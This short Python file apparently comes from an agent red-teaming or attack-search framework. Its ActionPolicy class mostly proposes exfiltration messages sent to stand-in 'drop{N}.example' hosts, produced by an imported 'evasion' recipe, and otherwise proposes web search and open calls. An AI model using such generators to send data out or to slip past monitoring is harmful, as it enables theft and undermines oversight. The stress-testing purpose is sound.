from __future__ import annotations
import random
from src.engine.archive import Exemplar
from src.recipes.evasion import clean_exfil_message

class ActionPolicy:
    def __init__(self, rng_urls: int = 1000) -> None:
        self.rng_urls = rng_urls

    def propose(self, exemplar: Exemplar, rng: random.Random) -> str:
        if rng.random() < 0.7:
            host = rng.randrange(self.rng_urls)
            return clean_exfil_message(url=f"http://drop{host}.example/c")
        if rng.random() < 0.5:
            return f"CALL web.search query=q{rng.randrange(1000)}"
        return f"CALL web.open id=page_{rng.randrange(19000)}"
